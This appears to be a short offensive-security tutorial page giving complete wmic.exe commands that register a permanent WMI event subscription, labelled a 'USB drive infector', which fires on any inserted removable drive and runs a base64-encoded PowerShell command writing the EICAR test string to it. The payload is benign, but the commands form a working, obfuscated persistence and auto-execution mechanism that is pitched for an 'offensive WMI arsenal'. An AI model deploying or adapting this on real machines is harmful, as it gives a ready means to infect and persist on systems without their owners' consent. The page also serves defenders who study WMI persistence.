<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Example</title>
</head><body>In this example, we’re going to use wmic.exe to create a PoC USB drive infector that will immediately drop the EICAR string to eicar.txt in the root folder of any inserted removable media.<br/>
<br/>
#Change the event filter to use something other than "USB Inserted"<br/>
1) Create an __EventFilter instance.<br/>
wmic /NAMESPACE:"\\root\subscription" PATH <b>__EventFilter</b>&nbsp;CREATE Name="<b>VolumeArrival</b>", QueryLanguage="WQL", Query="SELECT * FROM Win32_VolumeChangeEvent WHERE EventType=2"<br/>
<br/>
#Actions that happen when Event occurs<br/>
2) Create an __EventConsumer instance. CommandLineEventConsumer in this example.<br/>
wmic /NAMESPACE:"\\root\subscription" PATH <b>CommandLineEventConsumer</b>&nbsp;CREATE Name="<b>InfectDrive</b>", CommandLineTemplate="powershell.exe -NoP -C [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String('WDVPIVAlQEFQWzRcUFpYNTQoUF4pN0NDKTd9JEVJQ0FSLVNUQU5EQVJELUFOVElWSVJVUy1URVNULUZJTEUhJEgrSCo=')) | Out-File %DriveName%\eicar.txt"<br/>
<br/>
3) Obtain the __RELPATH of the __EventFilter and __EventConsumer instances. This built-in, system property provides the object instance syntax needed when creating a __FilterToConsumerBinding instance.<br/>
wmic /NAMESPACE:"\\root\subscription" PATH <b>__EventFilter</b>&nbsp;GET __RELPATH /FORMAT:list<br/>
wmic /NAMESPACE:"\\root\subscription" PATH <b>CommandLineEventConsumer</b>&nbsp;GET __RELPATH /FORMAT:list<br/>
<br/>
4) Create a __FilterToConsumerBinding instance. The syntax used for the Filter and Consumer properties came from the __RELPATH properties in the previous step.<br/>
wmic /NAMESPACE:"\\root\subscription" PATH <b>__FilterToConsumerBinding</b>&nbsp;CREATE Filter="__EventFilter.Name=\"VolumeArrival\"", Consumer="CommandLineEventConsumer.Name=\"InfectDrive\""<br/>
<br/>
At this point, the USB drive infector is registered and running!<br/>
<br/>
5) Optional: Remove all instances - i.e. unregister the permanent WMI event subscription.<br/>
<br/>
wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter WHERE Name="VolumeArrival" DELETE<br/>
wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer WHERE Name="InfectDrive" DELETE<br/>
<br/>
So that’s all there is to it! Hopefully, this will be a useful tool to add to your offensive WMI arsenal!</body></html>